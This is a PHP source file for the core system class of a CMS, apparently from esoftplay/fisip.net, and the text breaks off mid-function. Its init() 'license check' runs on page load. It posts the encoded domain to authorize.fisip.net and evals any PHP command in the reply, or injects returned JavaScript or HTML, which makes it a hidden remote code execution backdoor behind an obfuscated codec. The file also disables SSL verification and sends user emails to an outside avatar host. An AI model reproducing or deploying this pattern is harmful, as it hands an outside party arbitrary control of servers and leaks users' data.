<?php  if ( ! defined('_VALID_BBC')) exit('No direct script access allowed');

class bbcsystem
{
	var $is_stop      = false;
	var $debug        = false;
	var $is_topNavSet = false;
	var $cache_clear  = false;
	var $mod_var      = array();
	var $email        = array();
	var $arrNav       = array();
	var $lastNav      = array();
	var $Nav          = array();
	var $js_link      = array('all'=>array(), 'meta'=>array());
	var $css_link     = array('all'=>array(), 'meta'=>array());
	var $meta_tag     = array();
	var $_key, $allContentBlocks, $db, $def_css,
			$def_js, $is_init, $layout, $menu_id,
			$menu_real, $module_array, $module_id,
			$module_id_real, $module_name, $template_dir,
			$template_js, $template_url, $tips, $wildcard, $no_tpl;
	function __construct   ()
	{
		global $db, $_CONFIG;
		if (empty($this->template_url))
		{
			$temp               = $this->layout_fetch();
			$this->template_url = _URL.'templates/'.$temp;
			$this->template_dir = _ROOT.'templates/'.$temp;
			$this->template_js  = '';
			$this->db           =& $db;
			$this->init();
			$this->_get_module_id();
			$this->_get_menu_id();

			$this->nav_list($this->menu_id);
			$this->link_set($this->template_url.'css/style.css', 'css');
			$this->link_set($this->template_url.'js/script.js', 'js');
			$this->set_layout();
		}
		$this->debug = $_CONFIG['site']['debug'];
	}
	function __destruct ()
	{
		if ($this->cache_clear)
		{
			_func('path', 'delete', _CACHE);
		}
	}
	public function set_layout($file = '')
	{
		if (strpos($file, '.php') === false)
		{
			$file .= '.php';
		}
		if(is_file($file))
		{
			$this->layout = $file;
		}else
		if(is_file($this->template_dir.$file))
		{
			$this->layout = $this->template_dir.$file;
		} else {
			$this->layout = $this->template_dir.'index.php';
		}
	}
	public function layout_fetch()
	{
		global $db, $_CONFIG;
		$output = '';
		if((_ADMIN !=''))
		{
			$output = _ADMIN;
		}else{
			if(!empty($_SESSION['option']['template']))
			{
				if(file_exists( _ROOT.'templates/'.$_SESSION['option']['template'].'/index.php'))
				{
					$_CONFIG['template'] = $_SESSION['option']['template'];
					$output = $_CONFIG['template'].'/';
				}else{
					unset($_SESSION['option']['template']);
				}
			}
			if(empty($output))
			{
				$output = $_CONFIG['template'].'/';
			}
		}
		return $output;
	}
	// digunakan untuk menggunakan template lain sementara (tidak disimpan)
	public function layout_change($template)
	{
		$template = trim($template, '/');
		if (!empty($template))
		{
			if (file_exists(_ROOT.'templates/'.$template.'/index.php'))
			{
				global $_CONFIG;
				$this->template_url  = _URL.'templates/'.$template.'/';
				$this->template_dir  = _ROOT.'templates/'.$template.'/';
				$_CONFIG['template'] = $template;
				$this->link_set($this->template_url.'css/style.css', 'css');
				$this->link_set($this->template_url.'js/script.js', 'js');
				$this->set_layout();
				return true;
			}
		}
		return false;
	}
	private function _get_module_id()
	{
		global $Bbc;
		if(!$this->is_init) exit;
		$mod = isset($_GET['mod']) ? $_GET['mod'] : $Bbc->home;
		$module_name = strstr($mod, '.') ? substr($mod, 0, strrpos($mod, '.')) : $mod;
		$module_id = $this->get_module_id($module_name);
		if($module_id == 0)
		{
			$mod = $Bbc->notfound;
			$module_name = strstr($mod, '.') ? substr($mod, 0, strrpos($mod, '.')) : $mod;
			$module_id = $this->get_module_id($module_name);
		}else
		if(_ADMIN =='')
		{ // Public Access
			$q =  "SELECT * FROM `bbc_module` WHERE `id`=".$module_id;
			$row = $this->db->cacheGetRow($q);
			$this->_get_permission($row, 'module');
			meta_title($row['site_title'], 2);
			meta_desc($row['site_desc']);
			meta_keyword($row['site_keyword']);
		}
		if(_ADMIN =='')
		{
			lang_fetch(0);
			lang_fetch($module_id);
		}
		$this->module_name   = $module_name;
		$this->module_id     = $module_id;
		$Bbc->module         = $mod;
		$Bbc->mod['name']    = str_replace(strrchr($mod, '.'), '', $mod);
		$Bbc->mod['url']     = _URL.'modules/'.$Bbc->mod['name'].'/'._ADMIN;
		$Bbc->mod['root']    = _ROOT.'modules/'.$Bbc->mod['name'].'/'._ADMIN;
		$Bbc->mod['dir']     = _ROOT.'images/modules/'.$Bbc->mod['name'].'/';
		$Bbc->mod['image']   = _URL.'images/modules/'.$Bbc->mod['name'].'/';
		$Bbc->mod['circuit'] = _URL._ADMIN.'index.php?mod='.$Bbc->mod['name'];
		$Bbc->mod['task']    = substr(strrchr($mod, '.'), 1);
		$this->mod_var       = $Bbc->mod;
	}
	public function module_change($mod)
	{
		$module_id = $this->get_module_id($mod);
		if($module_id > 0)
		{
			global $Bbc;
			$Bbc->module         = $mod;
			$Bbc->mod['name']    = str_replace(strrchr($mod, '.'), '', $mod);
			$Bbc->mod['url']     = _URL.'modules/'.$Bbc->mod['name'].'/'._ADMIN;
			$Bbc->mod['root']    = _ROOT.'modules/'.$Bbc->mod['name'].'/'._ADMIN;
			$Bbc->mod['dir']     = _ROOT.'images/modules/'.$Bbc->mod['name'].'/';
			$Bbc->mod['image']   = _URL.'images/modules/'.$Bbc->mod['name'].'/';
			$Bbc->mod['circuit'] = _URL._ADMIN.'index.php?mod='.$Bbc->mod['name'];
			$Bbc->mod['task']    = substr(strrchr($mod, '.'), 1);
			$this->module_name   = $Bbc->mod['name'];
			$this->module_id     = $module_id;
			lang_fetch($module_id);
			if(is_file(_ROOT.'modules/'.$Bbc->mod['name'].'/_function.php'))
				include_once _ROOT.'modules/'.$Bbc->mod['name'].'/_function.php';
		}
	}
	public function module_clear()
	{
		global $Bbc;
		$Bbc->mod = $this->mod_var;
		$module_id = $this->get_module_id($Bbc->mod['name']);
		$this->module_name	= $Bbc->mod['name'];
		$this->module_id		= $module_id;
		lang_fetch($module_id);
	}
	public function get_module_id($name = '')
	{
		if(empty($name)) return $this->module_id;
		else{
			if(!isset($this->module_array) || empty($this->module_array))
			{
				$q = "SELECT `name`, `id` FROM `bbc_module` WHERE `active`=1";
				$this->module_array = $this->db->cache('getAssoc', $q, 'modules.cfg');
			}
			$id = isset($this->module_array[$name]) ? $this->module_array[$name] : 0;
		}
		return $id ? $id : 0;
	}
	public function change_var(&$var, $change = '')
	{
		$change = trim($change);
		if(!empty($change)) $var = $change;
	}
	private	function _get_menu_id()
	{
		$REQUEST_URI = @$_SERVER['REQUEST_URI'];
		$menu_id = (_ADMIN=='') ? @intval($_GET['menu_id']) : @intval($_GET['admin_id']);
		if(!$this->is_init) exit;
		$row = $this->_get_menu_exact($REQUEST_URI, false, $menu_id);
		$this->menu_id = !empty($row['id']) ? $row['id'] : @$_SESSION[bbcAuth.'menu_id'];
		if(empty($_SERVER['QUERY_STRING'])) $this->menu_id = 0;
		$this->menu_real = !empty($row['id']) ? true : false;
		if($this->menu_real)
		{
			$_SESSION[bbcAuth.'menu_id'] = $this->menu_id;
			if(!empty($row['title']) && !empty($_GET['mod']))
			{
				meta_title($row['title']);
			}
		}
		if($this->menu_id)
		{
			if(!preg_match('/mod=user\./s', $REQUEST_URI))
				$_SESSION[bbcAuth.'lastpage'] = $REQUEST_URI;
		}
		$this->_get_permission($row, 'menu');
	}
	/*======================================================
	 * THIS FUNCTION IS VERY HANDY, BECAREFULL TO USE THIS..
	 *=====================================================*/
	private	function _get_menu_exact($ThisLink, $lessVar = false, $menu_id = 0)
	{
		if($menu_id == -1)
		{
			return array(
				'id'				=> -1,
				'title'			=> lang('Home'),
				'protected'	=> 0
				);
		}
		if (!$lessVar)
		{
			$ThisLink = preg_replace('~^'.preg_quote(_URL, '~').'~s', '', $ThisLink);
			$ThisLink = preg_replace('~^'.preg_quote(_URI, '~').'~s', '', $ThisLink);
			$ThisLink = preg_replace('~^'.preg_quote(_ADMIN, '~').'~s', '', $ThisLink);
		}
		if($menu_id > 0)
		{
			$data = $this->menu_fetch('id', $menu_id);
			if(empty($data['link']) || stristr($ThisLink, trim($data['link'])))
			{
				return array(
					'id'        => $data['id'],
					'title'     => $data['title'],
					'protected' => $data['protected']
					);
			}else{
				return $this->_get_menu_exact($ThisLink, true);
			}
		}else{
			if($lessVar)
			{
				$v = array(
					strrpos($ThisLink, '&'),
					strrpos($ThisLink, '-'),
					strrpos($ThisLink, '_'),
					strrpos($ThisLink, '?')
					);
				rsort($v);
				$ThisLink = substr($ThisLink, 0, intval($v[0]));
			}
			if(empty($ThisLink) || $ThisLink=='index.php')
			{
				return array('id' => 0, 'protected' => 0);
			}else
			if(substr($ThisLink, 0, 9) == 'index.php')
			{
				$is_admin = (_ADMIN != '') ? 1 : 0;
				$output   = $this->menu_fetch('link', $ThisLink, 'like');
				if($output['id'] > 0)
				{
					return $output;
				}else{
					return $this->_get_menu_exact($ThisLink, true);
				}
			}
		}
	}
	private	function _get_permission($row, $type)
	{
		if (defined('_AsYnCtAsK'))
		{
			return true;
		}
		global $Bbc, $user;
		if(!empty($row['protected']))
		{
			$passed = false;
			switch($type)
			{
				case 'module':
					if($row['allow_group']==',all,' && !empty($user->is_login))
					{
						$passed = true;
					}else
					if(!empty($user->is_login))
					{
						$r_group = repairExplode($row['allow_group']);
						foreach($user->group_ids AS $group_id)
						{
							if(in_array($group_id, $r_group))
							{
								$passed = true;
								break;
							}
						}
					}
					break;
				case 'menu':
					if(!empty($user->is_login))
					{
						if (empty($user->menu_ids))
						{
							$user->menu_ids = array();
						}
						if(in_array('all', $user->menu_ids))
						{
							$passed = true;
						}else
						if(in_array($row['id'], $user->menu_ids))
						{
							$passed = true;
						}
					}
					break;
			}
			if(!$passed and $_GET['mod'] != $Bbc->denied)
			{
				$this->denied();
			}
		}
	}
	public function denied($url='')
	{
		if (defined('_AsYnCtAsK'))
		{
			return false;
		}
		global $Bbc;
		if(empty($url))
		{
			$url = 'index.php?mod='.$Bbc->denied;
			$uri = substr($Bbc->uri, 1);
			if (!empty($uri))
			{
				$url .= '&return='.urlencode($uri);
			}
		}
		redirect($url);
	}

	public function nav_list($menu_id)
	{
		$menu_id = intval($menu_id);
		if($menu_id > 0 && $this->is_topNavSet == false)
		{
			$dt = $this->menu_fetch('id', $menu_id);
			if($dt['id'] > 0)
			{
				extract($dt);
				if(_ADMIN == '')
				{
					if(empty($link)) 			$link = _URL;
					elseif(!empty($seo)) 	$link = _URL.$seo.'.html';
					elseif(!empty($link)) $link = (preg_match("#^(?:".str_replace(':', '\:', URL)."|index.php\??)#is", $link)) ? $link.'&menu_id='.$id : $link;
					else 									$link = seo_url();
				}else{
					$link = !empty($link) ? $link.'&admin_id='.$id : seo_url();
				}
				$this->arrNav[] = array(
					'title' => $title,
					'link' => $link
					);
				if($par_id > 0)
				{
					$this->nav_list($par_id);
				}
			}
		}
	}

	public function nav_change($title, $link = '')
	{
		$link         = !empty($link) ? $link : seo_url();
		$this->arrNav = array(
			array(
				'title' => $title,
				'link'  => $link
				)
			);
		$this->is_topNavSet = true;
	}

	public function nav_add($title, $link = '')
	{
		$link = !empty($link) ? $link : seo_url();
		$this->lastNav[] = array('title' => $title, 'link' => $link);
	}

	public function nav_show()
	{
		if(_ADMIN == '')
		{
			$out = $this->menu_fetch('link', '');
			$menu_id = $out['id'];
			if( $this->menu_id != $menu_id || (!$this->menu_real && $this->menu_id == $menu_id) )
			{
				$home = array(array('title' => lang('Home') , 'link' => _URL));
			}else{
				$home = array();
			}
		}else{
			$home = array();//array(array('title' => lang('Home') , 'link' => _URL._ADMIN));
		}
		$arr    = array_reverse($this->arrNav);
		$arr    = array_merge($home, $arr);
		$arr    = array_merge($arr, $this->lastNav);
		$last   = array();
		$lasti  = end($arr);
		$output = '<ol class="breadcrumb">';
		foreach($arr AS $dt)
		{
			if (!empty($dt['title']) && !empty($dt['link']))
			{
				$add	= ( $dt['link'] == _URL._ADMIN ) ? ' target="_parent"' : '';
				$ldd	= ($dt['link']==@$lasti['link']) ? ' class="active"' : '';
				if(!in_array($dt['link'], $last))
				{
					$output .= '<li'.$ldd.'><a href="'.$dt['link'].'"'.$add.'>'.$dt['title'].'</a></li>';
				}
				$last[] = $dt['link'];
			}
		}
		$output .= '</ol>';
		return $output;
	}
	public function menu_get_all()
	{
		global $Bbc;
		if(isset($Bbc->menu->all_array) && is_array($Bbc->menu->all_array)) return $Bbc->menu->all_array;

		$is_admin = (_ADMIN == '') ? 0 : 1;
		$q        = "SELECT * FROM `bbc_menu` AS m LEFT JOIN `bbc_menu_text` AS t ON (m.`id`=t.`menu_id` AND `lang_id`=".lang_id().") WHERE `is_admin`={$is_admin} AND `active`=1 ORDER BY `cat_id`, `par_id`, `orderby` ASC";
		$file     = 'lang/menu_'.lang_id().'.cfg';
		if($is_admin)
		{
			$r = $this->db->getAll($q);
		}else{
			$r = $this->db->cache('getAll', $q, $file);
		}
		$Bbc->menu            = new stdClass;
		$Bbc->menu->all_array = array();
		foreach($r AS $dt)
		{
			$Bbc->menu->all_array[$dt['id']] = $dt;
		}
		return $Bbc->menu->all_array;
	}
	public function menu_fetch($field, $value, $method = '=')
	{
		$r = $this->menu_get_all();
		$output = array('id' => 0, 'protected' => 0, 'title' => '');
		if($field == 'id')
		{
			if(isset($r[$value])) return $r[$value];
			else return $output;
		}
		foreach($r AS $id => $dt)
		{
			switch($method)
			{
				case '>': if($dt[$field] > $value) { return $dt;} break;
				case '<': if($dt[$field] < $value) { return $dt;} break;
				case '>=':if($dt[$field] >= $value){ return $dt;} break;
				case '<=':if($dt[$field] <= $value){ return $dt;} break;
				case '=': if($dt[$field] == $value){ return $dt;} break;
				case 'like': if( stristr($dt[$field], $value)){ return $dt;} break;
				default: return $output;break;
			}
		}
		return $output;
	}
	public function link_set($file, $type = 'css')
	{
		$file = $this->link_repair($file, $type);
		if($type == 'css')
		{
			$this->def_css = $file;
		}
		else $this->def_js = $file;
	}
	public function link_css($css, $is_meta = true)
	{
		$css = $this->link_repair($css, 'css');
		if($css)
		{
			if(!in_array($css, $this->css_link['all']))
			{
				$this->css_link['all'][] = $css;
				if($is_meta) $this->css_link['meta'][] = $css;
				else echo '<link href="',$css,'" rel="stylesheet" type="text/css" />', "\n";
			}
		}
	}
	public function link_js($js, $is_meta = true)
	{
		$js = $this->link_repair($js, 'js');
		if($js)
		{
			if(!in_array($js, $this->js_link['all']))
			{
				$this->js_link['all'][] = $js;
				if($is_meta) $this->js_link['meta'][] = $js;
				else echo '<script src="',$js, '" type="text/javascript"></script>', "\n";
			}
		}
	}
	public function link_repair($file, $type = 'css')
	{
		global $Bbc;
		$real_file = preg_replace('~(\?.*?)?$~is', '', $file);
		if(is_file($this->template_dir.$type.'/'.$real_file))
		{
			return $this->template_url.$type.'/'.$file;
		}else
		if(is_file($Bbc->mod['root'].$real_file))
		{
			return $Bbc->mod['url'].$file;
		}else
		if(is_file($real_file))
		{
			return str_replace(_ROOT, _URL, $file);
		}
		$file = str_replace(_ROOT, '', $file);
		$file = str_replace(_URL, '', $file);
		$real_file = preg_replace('~(\?.*?)?$~is', '', $file);
		if(is_url($real_file)) return $file;
		elseif(is_file(_ROOT.$real_file)) return _URL.$file;
		else return false;
	}
	public function meta($is_header_js = true)
	{
		global $_CONFIG;
		$icon = is_file(_ROOT.'images/'.$_CONFIG['site']['icon']) ? '
	<link rel="shortcut icon" type="image/x-icon" href="'._URL.'images/'.$_CONFIG['site']['icon'].'" />' : '';
		$output = '
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>'.$_CONFIG['site']['title'].'</title>
	<meta name="description" content="'.$_CONFIG['site']['desc'].'">
	<meta name="keywords" content="'.$_CONFIG['site']['keyword'].'">
	<meta name="developer" content="fisip.net">
	<meta name="Author" content="'.$_CONFIG['site']['url'].'">
	<meta name="ROBOTS" content="all, index, follow">'.$icon.'
	<link rel="alternate" type="application/rss+xml" title="'.$_CONFIG['site']['title'].'" href="'.site_url('index.php?mod=content.rss').'" />';
		if(!empty($this->meta_tag))
		{
			$output .= "\n\t".implode("\n\t",(array)$this->meta_tag);
		}
		$arr = array_unique(array_merge(array($this->def_css), $this->css_link['meta']));
		foreach((array)$arr AS $css)
		{
			if(!empty($css))
			{
				$output .= "\n\t".'<link href="'.$css.'" rel="stylesheet" type="text/css" />';
			}
		}
		$output .= "\n\t".'<script type="text/javascript">var _ROOT="'._URI.'";var _URL="'._URL.'";'.$this->content_read(_ROOT.'templates/script.js').'</script>';
		$arr = array_unique(array_merge(array($this->def_js), $this->js_link['meta']));
		$jses = '';
		foreach((array)$arr AS $js)
		{
			if(!empty($js))
			{
				$jses .= "\n\t".'<script src="'.$js.'" type="text/javascript"></script>';
			}
		}
		if ($is_header_js)
		{
			$output .= $jses;
		}else{
			$this->template_js = $jses;
		}
		$output .= "\n";
		return $output;
	}
	public function meta_add($txt = '')
	{
		if(!empty($txt))
		{
			$this->meta_tag[] = $txt;
		}
	}
	public function tip_tool($text, $icon='question-sign', $position='top'/*top|right|bottom|left*/)
	{
		$output = '';
		if (!empty($text))
		{
			$output = '<span class="glyphicon glyphicon-'.$icon
			.'" data-toggle="popover" data-placement="'.$position
			.'" data-content="'.htmlentities(trim($text)).'"></span>';
			if (empty($this->tips))
			{
				$this->tips = 1;
				$output .= '<script type="text/javascript">var BS3load_popover = 1;</script>';
			}
		}
		return $output;
	}
	public function tip_text($title, $text, $position='top'/*top|right|bottom|left*/)
	{
		$output = '';
		if (!empty($title))
		{
			if (!empty($text))
			{
				$output = '<span class="tips" title="'.htmlentities($title)
				.'" data-toggle="popover" data-placement="'.$position
				.'" data-content="'.htmlentities(trim($text)).'">'.$title.'</span>';
				if (empty($this->tips))
				{
					$this->tips = 1;
					$output .= '<script type="text/javascript">var BS3load_popover = 1;</script>';
				}
			}else{
				$output = $title;
			}
		}
		return $output;
	}
	public function button($link, $text = '', $icon='send')
	{
		if (empty($text))
		{
			return '<div class="clearfix"></div><span type="button" class="btn btn-default btn-sm" onclick="document.location.href=\''.$link.'\';"><span class="glyphicon glyphicon-chevron-left"></span></span> ';
		}else{
			return '<button type="button" class="btn btn-default btn-sm" onclick="document.location.href=\''.$link.'\';">'.icon($icon).' '.$text.'</button>';
		}
	}
	public function msg($Msg, $title='info' /*success|info|warning|danger*/)
	{
		switch ($title) {
			case 'success':
				$icon = 'ok-sign';
				break;
			case 'warning':
				$icon = 'warning-sign';
				break;
			case 'error':
				$title = 'danger';
			case 'danger':
				$icon = 'minus-sign';
				break;
			case 'info':
			default:
				$title = 'info';
				$icon = 'info-sign';
				break;
		}
		$output = '<div class="alert alert-'.$title.'" role="alert">'.icon($icon).' '.$Msg.'</div>';
		return $output;
	}
	public function stop($bool = true)
	{
		$this->is_stop = $bool;
	}
	/*=====================================
	$output = array(
		'valid'   => '1',
		'command' => '',
		'exec'    => 'php' || 'html' || 'javascript',
		'expired' => time(),
		'exit'    => 1 || 0
		);
 *====================================*/
	private function init()
	{
		_func('file');
		$this->is_init = false;
		if (empty($_SERVER['REMOTE_ADDR']))
		{
			$_SERVER['REMOTE_ADDR'] = '';
		}
		$r = array('127.0.0.1', '::1');
		if(in_array($_SERVER['REMOTE_ADDR'], $r) || preg_match('~^192\.168\.[0-9]+\.[0-9]+$~s', $_SERVER['REMOTE_ADDR']))
		{
			$this->is_init	= true;
			$this->wildcard = false;
			return $this->is_init;
		}
		if(!$this->is_init)
		{
			$this->is_init	= false;
			$this->wildcard = false;
			$this->_key     = 'PD9waHAgQFplbm7CjxMi8qIBSUGz5vdhReZsonyW0EVTt4YkcJO3Lu21f6NX+K/r';

			$do_update = false;
			// jika _CACHE belum ditentukan
			if (!defined('_CACHE')) define('_CACHE', _ROOT.'images/cache/');
			// jika _CACHE masih default maka diambil dari path images/
			if(_CACHE == _ROOT.'images/cache/')
			{
				$license_path = _ROOT.'images/license.txt';
			}else{
				// untuk jaga2 jika web dapat diakses dengan banyak domain maka license bisa di beda2 tempat
				$license_path = _CACHE.'license.txt';
			}
			// mengambil license terakhir untuk menentukan perlu diambil lagi dari authorixe ato tidak
			@list($file_expire_enc, $file_domain_enc, $file_wildcard) = @unserialize($this->decode($this->content_read($license_path)));
			// diakses melalui browser
			if (!empty($_SERVER['HTTP_HOST']))
			{
				$_URL = $_SERVER['HTTP_HOST']._URI;
			}else{
				// diakses melalui CLI
				$_URL = config('site','url');
			}
			$regex = array(
				'~^(?:f|ht)tps?://~is',
				'~^www\.?~is',
				'~^(api|data|m|mobile|new|test|[a-z]{2})\.~is'
				);
			$_URL = preg_replace($regex, '', $_URL);
			preg_match('~([a-z0-9\.\-]+)~is',$_URL, $m);
			$real_domain = @$m[1];
			// pengambilan license sebelumnya adalah wildcard
			if(!empty($file_wildcard))
			{
				$site_url = preg_replace($regex, '', config('site','url'));
				if(preg_match('~([a-z0-9\.\-]+)~is', $site_url, $site_url_match)) // ambil nama domain dari configuration
				{
					if(preg_match('~'.preg_quote($site_url_match[1], '~').'~is', $_URL)) // apakah nama domain yg diakses dgn configuration identik
					{
						$this->wildcard = true; // aktifkan wildcard
						$real_domain    = strtolower($site_url_match[1]);
					}
				}
			}
			$now_domain_enc = md5(md5(md5(base64_encode(gzdeflate($real_domain)))));
			$now_exp        = intval(strtotime('NOW'));
			if($now_domain_enc != $file_domain_enc)
			{
				$do_update  = true;
				// $this->db->Execute("TRUNCATE TABLE `bbc_log`");
				// $this->db->Execute("TRUNCATE TABLE `bbc_alert`");
				unset($_SESSION[bbcAuth.'_log']);
			}else
			// Licence Expired
			if($now_exp > intval(@gzinflate(base64_decode($file_expire_enc))))
			{
				$do_update = true;
			}
			if($do_update)
			{
				@chmod($license_path, 0777);
				@unlink($license_path);
				$output = $this->content_read('http://authorize.fisip.net/'.$this->encode($real_domain));
				if(empty($output))
				{
					exit;
				}else{
					$output = $this->decode($output);
					$output = urldecode_r(@unserialize($output));
					if(!isset($output['valid']))
					{
						exit;
					}
					if(!empty($output['command']))
					{
						switch(@$output['exec'])
						{
							case 'php':@eval($output['command']);	break;
							case 'javascript': echo '<script type="text/javascript">'.$output['command'].'</script>';	break;
							default: echo $output['command']; break;
						}
					}
					if($output['valid'] != '1')
					{
						if($output['exit'] == '1')
						{
							exit;
						}
					}else{
						if(!empty($output['expired']))
						{
							if($output['expired'] > $now_exp)
							{
								if (!isset($output['wildcard']))
								{
									$output['wildcard'] = isset($file_wildcard) ? $file_wildcard : 0;
								}
								$input = array(base64_encode(gzdeflate($output['expired'])), $now_domain_enc, $output['wildcard']);
								$input = $this->encode(serialize($input));
								$this->write($license_path, $input);
								@chmod($license_path, 0755);
								$this->is_init = true;
							}
						}
					}
				}
			}else{
				$this->is_init = true;
			}
			$this->_key = 'Powered by esoftplay.com';
		}
		if(!$this->is_init)
		{
			exit;
		}
	}
	private function encode($str)
	{
		$key = $this->_key;
		$hash= md5(time());
		$hasl= strlen($hash);
		$strl= strlen($str);
		$text= '';
		for($i=0;$i < $strl;$i++)
		{
			$text .= substr($hash, $i%$hasl, 1).substr($str, $i,1);
		}
		$text = strtr($text, strrev($key), $key);
		$text = strtr(base64_encode(gzdeflate($text)), strrev($key), $key);
		$text = (strtr(base64_encode(gzdeflate($text)), $key, strrev($key)));
		return str_replace('%', '0', urlencode($text));
	}
	private function decode($str)
	{
		$key = $this->_key;
		$str = (urldecode(preg_replace('~0([2-4][A-F])~s','%\1',$str)));
		$str = @gzinflate(base64_decode(strtr($str, $key, strrev($key))));
		$str = @gzinflate(base64_decode(strtr($str, strrev($key), $key)));
		$out = '';
		$len = strlen($str);
		for($i=0;$i < $len;$i++)
		{
			if($i%2)
			{
				$out .= substr($str, $i, 1);
			}
		}
		$out = strtr($out, $key, strrev($key));
		return $out;
	}
	public function curl()
	{
		return call_user_func_array(array($this, 'content_read'), func_get_args());
	}
	// $param = (int)cache in second | (array)POST Fields
	public function content_read($url, $param=array(), $option=array(), $is_debug = false)
	{
		if(!preg_match('~^(?:ht|f)tps?://~', $url) && file_exists($url))
		{
			return file_read($url);
		}
		$temp = defined(_CACHE) ? _CACHE : _ROOT.'images/cache/';
		$temp.= 'curl';
		if(is_numeric($param))
		{
			$text = unserialize($this->content_read($temp.'_'.md5($url)));
			if(!empty($text[0]) && $text[0] > time())
			{
				return @$text[1];
			}
			$presist = intval($param);
			$param   = '';
		}else $presist	= 0;
		$default = array(
			'CURLOPT_REFERER'    => $url,
			'CURLOPT_POST'       => empty($param) ? 0 : 1,
			'CURLOPT_POSTFIELDS' => $param,
			'CURLOPT_USERAGENT'  => 'Mozilla/5.0 (Windows NT 6.1; rv:18.0) Gecko/20100101 Firefox/18.0',
			'CURLOPT_HEADER'     => 0,
			'CURLOPT_HTTPHEADER' => array(
				'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
				'Accept-Language: en-US,en;q=0.5',
				'Accept-Encoding: gzip, deflate',
				'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7',
				'Keep-Alive: 300',
				'Connection: keep-alive',
				'Content-Type: application/x-www-form-urlencoded'),
			'CURLOPT_FOLLOWLOCATION' => 1,
			'CURLOPT_RETURNTRANSFER' => 1,
			'CURLOPT_COOKIEFILE'     => $temp,
			'CURLOPT_COOKIEJAR'      => $temp
			);
		if ($option===1)
		{
			$option   = array();
			$data['CURLOPT_HTTPHEADER'] = array_map('urlencode', $data['CURLOPT_HTTPHEADER']);
		}
		if (!is_array($option))
		{
			$option = (array)$option;
		}
		$data = array_merge($default, $option);
		$data['CURLOPT_POST'] = empty($data['CURLOPT_POSTFIELDS']) ? 0 : 1;

		$init = curl_init( $url );
		curl_setopt($init, CURLOPT_REFERER, $data['CURLOPT_REFERER'] );
		if($data['CURLOPT_POST'])
		{
			$data['CURLOPT_POSTFIELDS'] = is_array($data['CURLOPT_POSTFIELDS']) ? http_build_query($data['CURLOPT_POSTFIELDS']) : $data['CURLOPT_POSTFIELDS'];
			curl_setopt($init, CURLOPT_POSTFIELDS, $data['CURLOPT_POSTFIELDS']);
		}else $data['CURLOPT_POSTFIELDS'] = '';
		curl_setopt($init, CURLOPT_USERAGENT, $data['CURLOPT_USERAGENT']);
		curl_setopt($init, CURLOPT_HEADER, $data['CURLOPT_HEADER']);
		curl_setopt($init, CURLOPT_HTTPHEADER, $data['CURLOPT_HTTPHEADER']);
		curl_setopt($init, CURLOPT_POST, $data['CURLOPT_POST']);
		if (ini_get('open_basedir') == '' && ini_get('safe_mode' == 'Off'))
		{
			curl_setopt($init, CURLOPT_FOLLOWLOCATION, $data['CURLOPT_FOLLOWLOCATION'] );
		}
		curl_setopt($init, CURLOPT_RETURNTRANSFER, $data['CURLOPT_RETURNTRANSFER']);
		curl_setopt($init, CURLOPT_COOKIEFILE, $data['CURLOPT_COOKIEFILE']);
		curl_setopt($init, CURLOPT_COOKIEJAR, $data['CURLOPT_COOKIEJAR']);
		if(strtolower(substr($url, 0, 5)) == 'https')
		{
			curl_setopt($init, CURLOPT_SSL_VERIFYPEER, 0);
			curl_setopt($init, CURLOPT_SSL_VERIFYHOST, 0);
		}

		$output = curl_exec($init);
		if ( $is_debug )
		{
			$debug = array('URL : '.$url);
			if(!empty($data['CURLOPT_POSTFIELDS']))
			{
				$debug[] = 'Param : '.$data['CURLOPT_POSTFIELDS'];
			}
			$a = curl_errno( $init );
			if(!empty($a))
			{
				$debug[] = 'ErrNum : '.$a;
			}
			$a = curl_error( $init );
			if(!empty($a))
			{
				$debug[] = 'ErrMsg : '.$a;
			}
			if(empty($debug))
			{
				echo $output;
			}else{
				$debug[] = $output;
				if(function_exists('pr'))
				{
					pr($debug);
				}else{
					echo '<pre>'.print_r($debug, 1).'</pre>';
				}
			}
		}
		curl_close($init);
		if($presist > 0 && !empty($output))
		{
			if ( $fp = @fopen($temp.'_'.md5($url), 'w+'))
			{
				flock($fp, LOCK_EX);
				fwrite($fp, serialize(array(strtotime('+'.$presist.' SECOND'), $output)));
				flock($fp, LOCK_UN);
				fclose($fp);
			}
		}
		return $output;
	}
	public function write($filepath = '', $content='')
	{
		if ( ! $fp = @fopen($filepath, 'w+'))
		{
			return FALSE;
		}
		flock($fp, LOCK_EX);
		$output = fwrite($fp, $content);
		flock($fp, LOCK_UN);
		fclose($fp);
		return $output;
	}
	public function block_fetch()
	{
		include_once _SYS.'layout.blocks.php';
		$blc = new blockSystem('db');
		$this->allContentBlocks = $blc->get_block_all();
	}
	public function block_count($str = '')
	{
		$output = 0;
		if(!empty($str) and isset($this->allContentBlocks[$str]))
		{
			$output = count($this->allContentBlocks[$str]);
		}
		return $output;
	}
	public function block_show($str = '', $html = 'none')
	{
		$output = '';
		$str = strtolower($str);
		if($this->block_count($str) > 0)
		{
			if ($html!='none')
			{
				if ($html==1)
				{
					$html = array('<div class="row">'.'</div>');
				}else{
					if (!is_array($html))
					{
						echo '<h3>$sys->block_show($nama_posisi_nlock,$array_html_pembuka_dan_html_penutup); <br />'
						.'misal: $array_html_pembuka_dan_html_penutup = array("<div>","</div>");</h3>';
						die();
					}
				}
			}
			$output .= ($html=='none') ? '' : @$html[0];
			$output .= implode($this->allContentBlocks[$str]);
			$output .= ($html=='none') ? '' : @$html[1];
		}
		return $output;
	}
	public function avatar($email = '', $size=50)
	{
		if(file_exists($this->template_dir.'images/noPhoto.gif'))
		{
			$src = $this->template_url.'images/noPhoto.gif';
		}else{
			$src = _URL.'includes/system/icon/user.gif';
		}
		$alt = 'no available';
		if(is_email($email))
		{
			$key = '%nVCO1k5H2ve6iQI4cBtJ0z3dRDNAWhUrTG9plo8wyjXgLbEsxPuKMaFZYSm';
			$out = base64_encode(gzdeflate($email));
			$out = strtr($out, $key, strrev($key));
			if(strstr(urldecode($out), '%')) {
				$out = str_replace('%','---',$out);
			}
			$src = 'http://avatar.fisip.net/'.$out;
			$alt = '';
		}
		if ($size==1)
		{
			$output = $src;
		}else{
			$output = '<img src="'.$src.'" width="'.$size.'" alt="'.$alt.'" title="'.$alt.'" border=0 align="left" hspace="8" class="avatar" />';
		}
		return $output;
	}
	public function text_replace( $content, $debug = false )
	{
		$regex	= '#\[([a-z0-9_]+)\]#is';
		$r_text = $r_temp = array();
		if(is_array($debug))
		{
